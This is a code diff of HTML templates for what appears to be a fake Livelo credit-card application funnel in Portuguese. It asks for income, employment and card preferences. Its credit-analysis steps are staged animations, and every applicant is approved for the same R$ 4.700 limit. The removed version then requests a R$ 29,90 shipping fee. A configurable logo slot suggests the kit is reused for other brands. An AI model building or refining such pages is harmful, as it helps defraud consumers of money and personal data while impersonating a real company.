-      <p>Livelo | CNPJ: 12.888.241/0001-06</p>
-      <p>Alameda Xingu, 512 &middot; Alphaville, Barueri, SP</p>
-      <p>&copy; 2025 &middot; Todos os direitos reservados</p>
-    </footer>
-  </div>
+<div class="screen" id="screen-income">
+<div class="funnel-page">
+<div class="funnel-logo" style="text-align:center;margin-bottom:20px;">
+
+</div>
+<div class="step-card funnel-card">
+<h2 class="funnel-q">Qual sua renda mensal?</h2>
+<div class="choice-grid-2">
+<button class="big-choice-btn" onclick="selectIncome(this,'1000')">Até R$ 1.000</button>
+<button class="big-choice-btn" onclick="selectIncome(this,'2000')">Entre R$ 1.000<br/>e R$ 2.000</button>
+<button class="big-choice-btn" onclick="selectIncome(this,'4000')">Entre R$ 2.000<br/>e R$ 4.000</button>
+<button class="big-choice-btn" onclick="selectIncome(this,'8000')">Acima de R$ 4.000</button>
+</div>
+<div class="error-msg hidden" id="income-error"></div>
 </div>
 
+
+
+</div>
+</div>
 <!-- ═══════ EMPREGO ═══════ -->
-<div id="screen-employment" class="screen">
-  <div class="funnel-page">
-    <div class="funnel-logo">
-      <span style="color:#E5147A;font-size:1.4rem;line-height:1">&#9670;</span>
-      <span style="font-family:Inter,sans-serif;font-weight:800;font-size:1.35rem;color:#1A1A1A;letter-spacing:-0.02em"> livelo</span>
-    </div>
-    <div class="step-card funnel-card">
-      <h2 class="funnel-q">Em qual grupo você se encaixa?</h2>
-      <div class="choice-grid-2" style="margin-top:20px">
-        <button class="big-choice-btn" data-tipo="Empreendedor" onclick="selectEmprego(this)">Empreendedor</button>
-        <button class="big-choice-btn" data-tipo="Carteira assinada" onclick="selectEmprego(this)">Carteira assinada</button>
-        <button class="big-choice-btn" data-tipo="Desempregado" onclick="selectEmprego(this)">Desempregado</button>
-        <button class="big-choice-btn" data-tipo="Aposentado" onclick="selectEmprego(this)">Aposentado</button>
-        <button class="big-choice-btn" data-tipo="Servidor público" onclick="selectEmprego(this)">Servidor público</button>
-        <button class="big-choice-btn" data-tipo="Estudante" onclick="selectEmprego(this)">Estudante</button>
-        <button class="big-choice-btn full-row" data-tipo="Autônomo" onclick="selectEmprego(this)">Autônomo</button>
-      </div>
-      <div id="emp-error" class="error-msg hidden"></div>
-    </div>
-    <footer class="funnel-footer">
-      <p>Livelo | CNPJ: 12.888.241/0001-06</p>
-      <p>Alameda Xingu, 512 &middot; Alphaville, Barueri, SP</p>
-      <p>&copy; 2025 &middot; Todos os direitos reservados</p>
-    </footer>
-  </div>
+<div class="screen" id="screen-employment">
+<div class="funnel-page">
+<div class="funnel-logo" style="text-align:center;margin-bottom:20px;">
+
+</div>
+<div class="step-card funnel-card">
+<h2 class="funnel-q">Em qual grupo você se encaixa?</h2>
+<div class="choice-grid-2" style="margin-top:20px">
+<button class="big-choice-btn" data-tipo="Empreendedor" onclick="selectEmprego(this)">Empreendedor</button>
+<button class="big-choice-btn" data-tipo="Carteira assinada" onclick="selectEmprego(this)">Carteira assinada</button>
+<button class="big-choice-btn" data-tipo="Desempregado" onclick="selectEmprego(this)">Desempregado</button>
+<button class="big-choice-btn" data-tipo="Aposentado" onclick="selectEmprego(this)">Aposentado</button>
+<button class="big-choice-btn" data-tipo="Servidor público" onclick="selectEmprego(this)">Servidor público</button>
+<button class="big-choice-btn" data-tipo="Estudante" onclick="selectEmprego(this)">Estudante</button>
+<button class="big-choice-btn full-row" data-tipo="Autônomo" onclick="selectEmprego(this)">Autônomo</button>
+</div>
+<div class="error-msg hidden" id="emp-error"></div>
 </div>
 
+
+
+</div>
+</div>
 <!-- ═══════ MOTIVO ═══════ -->
-<div id="screen-motivo" class="screen">
-  <div class="funnel-page">
-    <div class="funnel-logo">
-      <span style="color:#E5147A;font-size:1.4rem;line-height:1">&#9670;</span>
-      <span style="font-family:Inter,sans-serif;font-weight:800;font-size:1.35rem;color:#1A1A1A;letter-spacing:-0.02em"> livelo</span>
-    </div>
-    <div class="step-card funnel-card">
-      <h2 class="funnel-q">O que &eacute; mais importante para voc&ecirc; em um cart&atilde;o de cr&eacute;dito?</h2>
-      <div class="options-grid" style="margin-top:20px">
-        <button class="option-tile" data-motivo="Limite alto" onclick="selectMotivo(this)">
-          <svg viewBox="0 0 24 24" fill="none" width="28" height="28"><rect x="2" y="5" width="20" height="14" rx="2" stroke="#E5147A" stroke-width="1.8"/><path d="M6 9h12M6 13h8" stroke="#E5147A" stroke-width="1.8" stroke-linecap="round"/></svg>
-          Limite alto
-        </button>
-        <button class="option-tile" data-motivo="Crédito imediato" onclick="selectMotivo(this)">
-          <svg viewBox="0 0 24 24" fill="none" width="28" height="28"><path d="M13 2L4.5 13.5H11L10 22l9-11.5H13z" stroke="#E5147A" stroke-width="1.8" stroke-linejoin="round"/></svg>
-          Cr&eacute;dito imediato
-        </button>
-        <button class="option-tile" data-motivo="Não consultar SPC/Serasa" onclick="selectMotivo(this)">
-          <svg viewBox="0 0 24 24" fill="none" width="28" height="28"><circle cx="12" cy="12" r="9" stroke="#E5147A" stroke-width="1.8"/><path d="M6 6l12 12" stroke="#E5147A" stroke-width="1.8" stroke-linecap="round"/></svg>
-          N&atilde;o consultar<br>SPC/Serasa
-        </button>
-        <button class="option-tile" data-motivo="Sem anuidade" onclick="selectMotivo(this)">
-          <svg viewBox="0 0 24 24" fill="none" width="28" height="28"><rect x="3" y="4" width="18" height="18" rx="3" stroke="#E5147A" stroke-width="1.8"/><path d="M3 9h18M8 4V2M16 4V2" stroke="#E5147A" stroke-width="1.8" stroke-linecap="round"/></svg>
-          Sem anuidade
-        </button>
-      </div>
-      <div id="motivo-error" class="error-msg hidden"></div>
-    </div>
-    <footer class="funnel-footer">
-      <p>Livelo | CNPJ: 12.888.241/0001-06</p>
-      <p>Alameda Xingu, 512 &middot; Alphaville, Barueri, SP</p>
-      <p>&copy; 2025 &middot; Todos os direitos reservados</p>
-    </footer>
-  </div>
+<div class="screen" id="screen-motivo">
+<div class="funnel-page">
+<div class="funnel-logo" style="text-align:center;margin-bottom:20px;">
+
+</div>
+<div class="step-card funnel-card">
+<h2 class="funnel-q" style="font-size:1.25rem;margin-bottom:24px;line-height:1.4">Qual é o seu interesse com um<br/>Cartão de Crédito hoje?</h2>
+<div style="display:flex;flex-direction:column;gap:10px">
+<button class="motivo-btn" data-motivo="Fazer uma compra específica" onclick="selectMotivo(this)">Fazer uma compra específica</button>
+<button class="motivo-btn" data-motivo="Fazer uma viagem" onclick="selectMotivo(this)">Fazer uma viagem</button>
+<button class="motivo-btn" data-motivo="Poder gastar mais" onclick="selectMotivo(this)">Poder gastar mais</button>
+<button class="motivo-btn" data-motivo="Organizar o meu financeiro" onclick="selectMotivo(this)">Organizar o meu financeiro</button>
+<button class="motivo-btn" data-motivo="Outros" onclick="selectMotivo(this)">Outros</button>
+</div>
+<div class="error-msg hidden" id="motivo-error"></div>
 </div>
 
+
+
+</div>
+</div>
 <!-- ═══════ VENCIMENTO ═══════ -->
-<div id="screen-billing" class="screen">
-  <div class="step-container">
-    <div style="width:100%;max-width:480px;margin-bottom:20px">
-  <div class="step-progress">
-    <div class="progress-bar"><div class="progress-fill" style="width:100%"></div></div>
-    <span class="progress-label">Etapa 4 de 4 — Vencimento</span>
-  </div>
+<div class="screen" id="screen-billing">
+<div class="funnel-page">
+<div class="funnel-logo" style="text-align:center;margin-bottom:20px;">
+
 </div>
-    <div class="step-card">
-      <div class="step-icon">
-        <svg viewBox="0 0 48 48" fill="none" width="48" height="48"><rect width="48" height="48" rx="12" fill="#FFF0F8"/><rect x="10" y="12" width="28" height="26" rx="3" stroke="#E5147A" stroke-width="2.5"/><path d="M16 12V8M32 12V8M10 20h28" stroke="#E5147A" stroke-width="2.5" stroke-linecap="round"/><circle cx="24" cy="31" r="3" fill="#E5147A"/></svg>
-      </div>
-      <h2 class="step-title">Qual é o seu dia de vencimento preferido?</h2>
-      <p class="step-sub">Escolha o dia do mês em que prefere que sua fatura seja gerada.</p>
-      <div class="billing-days">
-        <button class="day-btn" onclick="selectDay(this)">1</button>
-        <button class="day-btn" onclick="selectDay(this)">5</button>
-        <button class="day-btn" onclick="selectDay(this)">10</button>
-        <button class="day-btn" onclick="selectDay(this)">15</button>
-        <button class="day-btn" onclick="selectDay(this)">20</button>
-        <button class="day-btn" onclick="selectDay(this)">25</button>
-      </div>
-      <div id="billing-error" class="error-msg hidden">Selecione o dia de vencimento para continuar.</div>
-      <button class="btn-primary" onclick="submitBilling()">
-        <span id="billing-btn-text">Analisar meu perfil</span>
-        <div id="billing-spin" class="spinner hidden"></div>
-      </button>
+<div class="step-card funnel-card">
+<h2 class="funnel-q" style="font-size:1.25rem;margin-bottom:10px;line-height:1.4">Qual é o seu dia de vencimento preferido?</h2>
+<p class="step-sub" style="margin-top:0;margin-bottom:24px;font-size:0.9rem;text-align:center;color:var(--text-muted)">Escolha o dia do mês em que prefere que sua fatura seja gerada.</p>
+<style>
+.calendar-wrapper {
+    background: #FFFFFF;
+    border-radius: 20px;
+    padding: 20px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.04);
+    border: 1px solid rgba(0,0,0,0.02);
+    margin-bottom: 24px;
+}
+.calendar-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 16px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid #F3F4F6;
+    color: var(--text);
+    font-weight: 700;
+    font-size: 0.95rem;
+}
+.calendar-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+}
+.calendar-day-btn {
+    background: #F9FAFB;
+    border: 2px solid transparent;
+    border-radius: 14px;
+    padding: 16px 0;
+    font-size: 1.4rem;
+    font-weight: 800;
+    color: #374151;
+    cursor: pointer;
+    transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: inset 0 0 0 1px rgba(0,0,0,0.05);
+    position: relative;
+    overflow: hidden;
+    z-index: 1;
+}
+.calendar-day-btn:hover {
+    transform: translateY(-4px) scale(1.02);
+    background: #FFFFFF;
+    border-color: var(--pink);
+    color: var(--pink);
+    box-shadow: 0 12px 20px -8px rgba(229, 20, 122, 0.3);
+    z-index: 2;
+}
+.calendar-day-btn.selected {
+    background: var(--pink);
+    border-color: var(--pink);
+    color: #FFFFFF;
+    transform: translateY(-2px) scale(1.05);
+    box-shadow: 0 8px 24px rgba(229, 20, 122, 0.4);
+    z-index: 3;
+}
+.calendar-day-btn:active {
+    transform: scale(0.95);
+}
+.calendar-day-btn::after {
+    content: '';
+    position: absolute;
+    top: 50%; left: 50%;
+    width: 100%; height: 100%;
+    background: rgba(255,255,255,0.15);
+    border-radius: 50%;
+    transform: translate(-50%, -50%) scale(0);
+    transition: transform 0.5s ease;
+    z-index: -1;
+}
+.calendar-day-btn.selected::after {
+    transform: translate(-50%, -50%) scale(2.5);
+}
+</style>
+
+<div class="calendar-wrapper">
+    <div class="calendar-header">
+        <span>Dias disponíveis</span>
+        <svg fill="none" height="18" viewbox="0 0 24 24" width="18" stroke="currentColor" stroke-width="2"><rect height="18" rx="2" width="18" x="3" y="4"></rect><path d="M16 2v4M8 2v4M3 10h18"></path></svg>
     </div>
-  </div>
+    <div class="calendar-grid">
+        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">1</button>
+        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">5</button>
+        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">10</button>
+        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">15</button>
+        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">20</button>
+        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">25</button>
+    </div>
+</div>
+<div class="error-msg hidden" id="billing-error">Selecione o dia de vencimento para continuar.</div>
+<button class="btn-primary" onclick="submitBilling()" style="margin-top:24px">
+<span id="billing-btn-text">Analisar meu perfil</span>
+<div class="spinner hidden" id="billing-spin"></div>
+</button>
 </div>
 
+
+</div>
+</div>
+<!-- ═══════ LIMIT INFO ═══════ -->
+<div class="screen" id="screen-limit-info">
+<div class="step-container" style="justify-content:center;min-height:90vh">
+
+<div class="step-card" style="padding:40px 30px">
+<h2 class="step-title" style="font-size:1.3rem;margin-bottom:4px">Entenda como funciona seu limite</h2>
+<p class="step-sub" style="margin-top:0;margin-bottom:24px;font-size:0.85rem">Saiba como seu limite de crédito pode aumentar ou diminuir</p>
+<div style="display:flex;flex-direction:column;gap:12px;margin-bottom:24px">
+<div style="background:#F0FDF4;border:1px solid #BBF7D0;border-radius:12px;padding:20px;text-align:center">
+<div style="font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:6px">Aumento de Limite</div>
+<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">Caso você realize o pagamento das faturas em dia, seu limite será aumentado constantemente.</div>
+</div>
+<div style="background:#FEFCE8;border:1px solid #FEF08A;border-radius:12px;padding:20px;text-align:center">
+<div style="font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:6px">Redução de Limite</div>
+<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">No entanto, se houver atraso no pagamento das faturas, o limite poderá ser reduzido.</div>
+</div>
+</div>
+<button class="btn-primary" onclick="startAnalysis()" style="margin-top:0">Concordo →</button>
+</div>
+
+
+</div>
+</div>
 <!-- ═══════ ANÁLISE ═══════ -->
-<div id="screen-analysis" class="screen">
-  <div class="step-container" style="justify-content:center;min-height:100vh">
-    <div class="analysis-circle">
-      <svg viewBox="0 0 120 120" fill="none" width="130" height="130">
-        <circle cx="60" cy="60" r="52" stroke="#FBCFE8" stroke-width="8"/>
-        <circle cx="60" cy="60" r="52" stroke="#E5147A" stroke-width="8"
-                stroke-dasharray="326" stroke-dashoffset="326"
-                stroke-linecap="round" id="analysis-progress-circle"
-                style="transition:stroke-dashoffset 2.5s ease;transform:rotate(-90deg);transform-origin:center"/>
-        <text x="60" y="55" text-anchor="middle" font-family="Inter,sans-serif" font-weight="700" font-size="22" fill="#1A1A1A" id="analysis-pct">0%</text>
-        <text x="60" y="73" text-anchor="middle" font-family="Inter,sans-serif" font-size="10" fill="#888">analisando</text>
-      </svg>
-    </div>
-    <h2 class="analysis-title">Analisando seu perfil...</h2>
-    <div class="analysis-steps">
-      <div class="astep" id="astep-1"><div class="astep-icon pending"></div><span>Verificando identidade</span></div>
-      <div class="astep" id="astep-2"><div class="astep-icon pending"></div><span>Consultando histórico de crédito</span></div>
-      <div class="astep" id="astep-3"><div class="astep-icon pending"></div><span>Calculando limite disponível</span></div>
-      <div class="astep" id="astep-4"><div class="astep-icon pending"></div><span>Preparando sua proposta</span></div>
-    </div>
-  </div>
+<div class="screen" id="screen-analysis">
+<div class="step-container" style="justify-content:center;min-height:90vh">
+
+<h2 class="step-title" style="font-size:1.15rem;margin-bottom:24px">Aguarde enquanto processamos seu pedido</h2>
+<div class="card-preview-sm" style="margin-bottom:32px">
+<div class="credit-card sm" data-color="gradient_pink">
+<div class="card-face">
+<div class="card-row-top">
+<img alt="Livelo" src="/static/images/logo-branco.png" style="height:32px; max-width:140px; object-fit:contain; flex-shrink:0; display:block"/>
+<svg fill="none" height="18" style="flex-shrink:0;display:block" viewbox="0 0 24 24" width="18"><path d="M12 4C7.58 4 4 7.58 4 12s3.58 8 8 8" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path><path d="M12 7.5C9.01 7.5 6.5 10.01 6.5 13s2.51 5.5 5.5 5.5" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path><path d="M12 11C10.34 11 9 12.34 9 14s1.34 3 3 3" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path></svg>
+</div>
+<div class="card-chip"><svg fill="none" height="22" viewbox="0 0 40 30" width="30"><rect fill="#D4AF37" height="28" rx="4" stroke="#B8960C" stroke-width="0.5" width="38" x="1" y="1"></rect><rect fill="#C9A227" height="20" rx="2" stroke="#B8960C" stroke-width="0.5" width="16" x="12" y="5"></rect></svg></div>
+<div class="card-row-number"><span>4532</span><span class="dots">••••</span><span class="dots">••••</span><span>8790</span></div>
+<div class="card-row-bottom">
+<div><div class="card-label">NOME DO TITULAR</div><div class="card-value" id="analysis-name-display" style="font-size:0.68rem">SEU NOME</div></div>
+<div><div class="card-label">VALIDADE</div><div class="card-value" style="font-size:0.68rem">12/28</div></div>
+<svg fill="none" height="24" viewbox="0 0 52 32" width="36"><circle cx="20" cy="16" fill="#EB001B" opacity="0.9" r="14"></circle><circle cx="32" cy="16" fill="#F79E1B" opacity="0.9" r="14"></circle></svg>
+</div>
+</div>
+</div>
+</div>
+<div class="analysis-steps" style="max-width:280px;margin:0 auto;width:100%">
+<div class="astep" id="astep-1"><div class="astep-icon checking"></div><span class="check-txt">Aguardando resposta</span></div>
+<div class="astep" id="astep-2"><div class="astep-icon pending"></div><span class="check-txt">Analisando seu perfil</span></div>
+<div class="astep" id="astep-3"><div class="astep-icon pending"></div><span class="check-txt">Preparando seu cartão</span></div>
+<div class="astep" id="astep-4"><div class="astep-icon pending"></div><span class="check-txt">Finalizando solicitação</span></div>
 </div>
 
+
+</div>
+<svg style="display:none"><circle id="analysis-progress-circle"></circle><text id="analysis-pct"></text></svg>
+</div>
 <!-- ═══════ APROVADO ═══════ -->
-<div id="screen-approved" class="screen">
-  <div class="step-container">
-    <div style="text-align:center;margin-bottom:24px">
-  {%- if sys_config and sys_config.get('system_logo_url') and 'livelo' not in sys_config.get('system_logo_url','') and 'default' not in sys_config.get('system_logo_url','') %}
-    <img src="{{ sys_config.get('system_logo_url') }}" style="height:40px" alt="Logo">
-  {%- else %}
-    <svg viewBox="0 0 130 38" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:40px;display:inline-block">
-      <path d="M8 5L3 19l5 14" stroke="#E5147A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-      <text x="18" y="27" font-family="Inter,sans-serif" font-weight="800" font-size="22" fill="#1A1A1A">livelo</text>
-    </svg>
-  {%- endif %}
-</div>
-    <p style="font-size:0.9rem;font-weight:600;color:#6B7280;text-align:center;margin-bottom:4px">Seu Limite Disponível</p>
-    <div class="limit-value" id="approved-limit" style="text-align:center;margin-bottom:16px">R$ 4.700</div>
+<div class="screen" id="screen-approved">
+<div class="step-container" style="justify-content:center;min-height:90vh">
 
-    <div class="card-preview-sm">
-      <div class="credit-card sm" id="approved-card" data-color="gradient_pink" style="">
-  <div class="card-face">
-    <div class="card-row-top"><svg viewBox="0 0 80 22" fill="none" width="64" height="18" style="flex-shrink:0;display:block"><path d="M6 2L2 11l4 9" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><text x="14" y="16" font-family="Inter,sans-serif" font-weight="700" font-size="14" fill="white">livelo</text></svg><svg viewBox="0 0 24 24" fill="none" width="18" height="18" style="flex-shrink:0;display:block"><path d="M12 4C7.58 4 4 7.58 4 12s3.58 8 8 8" stroke="rgba(255,255,255,0.75)" stroke-width="1.8" stroke-linecap="round"/><path d="M12 7.5C9.01 7.5 6.5 10.01 6.5 13s2.51 5.5 5.5 5.5" stroke="rgba(255,255,255,0.75)" stroke-width="1.8" stroke-linecap="round"/><path d="M12 11C10.34 11 9 12.34 9 14s1.34 3 3 3" stroke="rgba(255,255,255,0.75)" stroke-width="1.8" stroke-linecap="round"/></svg></div>
-    <div class="card-chip"><svg viewBox="0 0 40 30" fill="none" width="30" height="22"><rect x="1" y="1" width="38" height="28" rx="4" fill="#D4AF37" stroke="#B8960C" stroke-width="0.5"/><rect x="12" y="5" width="16" height="20" rx="2" fill="#C9A227" stroke="#B8960C" stroke-width="0.5"/></svg></div>
-    <div class="card-row-number"><span>4532</span><span class="dots">••••</span><span class="dots">••••</span><span id="card-last4-approved-card">8790</span></div>
-    <div class="card-row-bottom">
-      <div><div class="card-label">Nome do Titular</div><div class="card-value" id="approved-name-display" style="font-size:0.68rem">SEU NOME</div></div>
-      <div><div class="card-label">Validade</div><div class="card-value" style="font-size:0.68rem">12/28</div></div>
-      <svg viewBox="0 0 52 32" fill="none" width="36" height="24"><circle cx="20" cy="16" r="14" fill="#EB001B" opacity="0.9"/><circle cx="32" cy="16" r="14" fill="#F79E1B" opacity="0.9"/></svg>
-    </div>
-  </div>
+<div class="step-card" style="padding:40px 30px">
+<div style="display:flex;justify-content:center;margin-bottom:20px">
+<div style="width:48px;height:48px;border-radius:50%;background:#D1FAE5;display:flex;align-items:center;justify-content:center">
+<svg fill="none" height="28" viewbox="0 0 24 24" width="28"><path d="M5 13l4 4L19 7" stroke="#10B981" stroke-linecap="round" stroke-linejoin="round" stroke-width="3"></path></svg>
 </div>
-    </div>
-
-    <div class="step-card" style="margin-top:16px">
-      <h2 class="step-title">Finalize o envio do seu cartão</h2>
-      <p class="step-sub">Confira os dados e o endereço de entrega antes de pagar o frete.</p>
-      <div class="pix-frete-value" id="approved-frete-val">R$ 29,90</div>
-      <button class="btn-primary" onclick="goToStep('card-style')" style="margin-top:8px">Pagar Frete 🔒</button>
-      <p style="font-size:0.78rem;color:#6B7280;text-align:center;margin-top:10px">
-        <svg viewBox="0 0 16 16" fill="none" width="13" height="13" style="vertical-align:middle;margin-right:4px"><path d="M8 1L2 4.5v4C2 11.5 4.8 14.5 8 15.5c3.2-1 6-4 6-7V4.5L8 1z" fill="#10B981" opacity="0.3" stroke="#10B981" stroke-width="1.2"/><path d="M5 8l2 2 4-3.5" stroke="#10B981" stroke-width="1.2" stroke-linecap="round"/></svg>
-        Pagamento 100% seguro
-      </p>
-      <div class="pix-summary-grid" id="approved-summary-grid">
-        <div class="pix-summary-box">
-          <div class="pix-summary-box-title">Resumo do frete</div>
-          <div class="pix-summary-row"><div class="pix-summary-row-label">Método</div><div class="pix-summary-row-val">SEDEX – Entrega expressa</div></div>
-          <div class="pix-summary-row"><div class="pix-summary-row-label">Prazo</div><div class="pix-summary-row-val">até 3 dias úteis</div></div>
-          <div class="pix-summary-row"><div class="pix-summary-row-label">Valor</div><div class="pix-summary-row-val pink" id="summary-frete-val">R$ 29,90</div></div>
-        </div>
-        <div class="pix-summary-box">
-          <div class="pix-summary-box-title">Dados de entrega</div>
-          <div class="pix-summary-row"><div class="pix-summary-row-label">Nome</div><div class="pix-summary-row-val" id="summary-name">—</div></div>
-          <div class="pix-summary-row"><div class="pix-summary-row-label">Endereço</div><div class="pix-summary-row-val" id="summary-end">—</div></div>
-          <div class="pix-summary-row"><div class="pix-summary-row-label">Bairro</div><div class="pix-summary-row-val" id="summary-bairro">—</div></div>
-          <div class="pix-summary-row"><div class="pix-summary-row-label">Cidade</div><div class="pix-summary-row-val" id="summary-cidade">—</div></div>
-        </div>
-      </div>
-    </div>
-  </div>
+</div>
+<h2 class="step-title" style="font-size:1.25rem;margin-bottom:12px;line-height:1.3">Seu cartão foi aprovado com<br/>sucesso!</h2>
+<p class="step-sub" style="margin-top:0;margin-bottom:20px;font-size:0.85rem">Parabéns! Você agora tem acesso a todos os benefícios exclusivos do seu novo cartão.</p>
+<div style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:16px;text-align:center;margin-bottom:20px">
+<p style="font-size:0.8rem;color:var(--text-muted);line-height:1.45;margin:0">Analisamos suas informações e notamos que este é o primeiro cartão que você solicita conosco. Sendo assim, não conseguimos liberar limites acima de R$ 5.000,00.</p>
+</div>
+<div style="background:var(--pink-dark);border-radius:12px;padding:24px;text-align:center;margin-bottom:20px;color:white;box-shadow:0 8px 24px rgba(229,20,122,0.3)">
+<div style="font-size:0.8rem;font-weight:600;margin-bottom:2px">Seu novo cartão</div>
+<div style="font-size:0.85rem;font-weight:800;margin-bottom:16px">VISA GOLD</div>
+<div id="approved-limit" style="font-size:1.8rem;font-weight:800;letter-spacing:-0.03em">R$ 4.700,00</div>
+</div>
+<div class="hidden" id="approved-frete-val" style="display:none"></div>
+<div class="hidden" id="approved-name-display" style="display:none"></div>
+<div class="hidden" id="summary-name" style="display:none"></div>
+<div class="hidden" id="summary-end" style="display:none"></div>
+<button class="btn-primary" onclick="goToStep('card-style')" style="margin-top:0">Continuar →</button>
 </div>
 
+
+</div>
+</div>
 <!-- ═══════ ESTILO DO CARTÃO ═══════ -->
-<div id="screen-card-style" class="screen">
-  <div class="funnel-page card-style-page">
-    <div class="funnel-logo">
-      <span style="color:#E5147A;font-size:1.4rem;line-height:1">&#9670;</span>
-      <span style="font-family:Inter,sans-serif;font-weight:800;font-size:1.35rem;color:#1A1A1A;letter-spacing:-0.02em"> livelo</span>
-    </div>
-    <p class="funnel-q" style="margin-bottom:4px">Personalize o seu cart&atilde;o</p>
-    <p style="font-size:0.85rem;color:var(--text-muted);text-align:center;margin-bottom:22px;line-height:1.5">Escolha o modelo que combina com voc&ecirc;</p>
+<div class="screen" id="screen-card-style">
+<div class="funnel-page card-style-page">
+<div class="funnel-logo" style="text-align:center;margin-bottom:20px;">
 
-    <!-- CARD SCENE — 3D flip wrapper -->
-    <div class="card-scene">
-      <div class="card-flipper" id="card-flipper">
-        <div class="advanced-card-preview" id="advanced-card-preview">
-          <!-- SVG pattern overlay -->
-          <svg class="card-pattern-svg" viewBox="0 0 340 200" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice">
-            <defs><clipPath id="acp-clip"><rect width="340" height="200" rx="18"/></clipPath></defs>
-            <g clip-path="url(#acp-clip)" id="card-pattern-inner">
-              <path d="M-20 120 C50 60 150 140 240 80 S360 60 400 80" stroke="white" fill="none" stroke-width="40" opacity="0.12"/>
-              <path d="M-20 160 C50 100 150 180 240 120 S360 100 400 120" stroke="white" fill="none" stroke-width="28" opacity="0.1"/>
-              <circle cx="320" cy="40" r="80" stroke="white" fill="none" stroke-width="2" opacity="0.18"/>
-              <circle cx="320" cy="40" r="52" stroke="white" fill="none" stroke-width="1.5" opacity="0.14"/>
-            </g>
-          </svg>
-          <!-- Card face content -->
-          <div class="adv-card-face">
-            <div class="adv-card-top">
-              <svg viewBox="0 0 80 22" fill="none" width="62" height="18"><path d="M6 2L2 11l4 9" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><text x="14" y="16" font-family="Inter,sans-serif" font-weight="700" font-size="14" fill="white">livelo</text></svg>
-              <svg viewBox="0 0 24 24" fill="none" width="18" height="18"><path d="M12 4C7.58 4 4 7.58 4 12s3.58 8 8 8" stroke="rgba(255,255,255,0.7)" stroke-width="1.8" stroke-linecap="round"/><path d="M12 7.5C9.01 7.5 6.5 10.01 6.5 13s2.51 5.5 5.5 5.5" stroke="rgba(255,255,255,0.7)" stroke-width="1.8" stroke-linecap="round"/><path d="M12 11C10.34 11 9 12.34 9 14s1.34 3 3 3" stroke="rgba(255,255,255,0.7)" stroke-width="1.8" stroke-linecap="round"/></svg>
-            </div>
-            <div class="adv-chip"><svg viewBox="0 0 40 30" fill="none" width="38" height="26"><rect x="1" y="1" width="38" height="28" rx="4" fill="#D4AF37" stroke="#B8960C" stroke-width="0.5"/><rect x="8" y="1" width="1.5" height="28" fill="#B8960C" opacity="0.4"/><rect x="30.5" y="1" width="1.5" height="28" fill="#B8960C" opacity="0.4"/><rect x="1" y="10" width="38" height="1.5" fill="#B8960C" opacity="0.4"/><rect x="1" y="18.5" width="38" height="1.5" fill="#B8960C" opacity="0.4"/><rect x="12" y="5" width="16" height="20" rx="2" fill="#C9A227" stroke="#B8960C" stroke-width="0.5"/></svg></div>
-            <div class="adv-card-number">4532 &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; 8790</div>
-            <div class="adv-card-bottom">
-              <div>
-                <div class="adv-card-label">NOME DO TITULAR</div>
-                <div class="adv-card-value" id="style-card-name">SEU NOME</div>
-              </div>
-              <div>
-                <div class="adv-card-label">VALIDADE</div>
-                <div class="adv-card-value">12/28</div>
-              </div>
-              <svg viewBox="0 0 52 32" fill="none" width="44" height="28"><circle cx="20" cy="16" r="14" fill="#EB001B" opacity="0.9"/><circle cx="32" cy="16" r="14" fill="#F79E1B" opacity="0.9"/><path d="M26 4.6A14 14 0 0 1 32 16 14 14 0 0 1 26 27.4 14 14 0 0 1 20 16 14 14 0 0 1 26 4.6z" fill="#FF5F00" opacity="0.85"/></svg>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
+</div>
+<p class="funnel-q" style="margin-bottom:4px">Personalize o seu cartão</p>
+<p style="font-size:0.85rem;color:var(--text-muted);text-align:center;margin-bottom:22px;line-height:1.5">Escolha o modelo que combina com você</p>
+<!-- CARD SCENE — 3D flip wrapper -->
+<div class="card-scene">
+<div class="card-flipper" id="card-flipper">
+<div class="advanced-card-preview" id="advanced-card-preview">
+<!-- SVG pattern overlay -->
+<svg class="card-pattern-svg" preserveaspectratio="xMidYMid slice" viewbox="0 0 340 200" xmlns="http://www.w3.org/2000/svg">
+<defs><clippath id="acp-clip"><rect height="200" rx="18" width="340"></rect></clippath></defs>
+<g clip-path="url(#acp-clip)" id="card-pattern-inner">
+<path d="M-20 120 C50 60 150 140 240 80 S360 60 400 80" fill="none" opacity="0.12" stroke="white" stroke-width="40"></path>
+<path d="M-20 160 C50 100 150 180 240 120 S360 100 400 120" fill="none" opacity="0.1" stroke="white" stroke-width="28"></path>
+<circle cx="320" cy="40" fill="none" opacity="0.18" r="80" stroke="white" stroke-width="2"></circle>
+<circle cx="320" cy="40" fill="none" opacity="0.14" r="52" stroke="white" stroke-width="1.5"></circle>
+</g>
+</svg>
+<!-- Card face content -->
+<div class="adv-card-face">
+<div class="adv-card-top">
+<img alt="Livelo" src="/static/images/logo-branco.png" style="height:32px; max-width:140px; object-fit:contain"/>
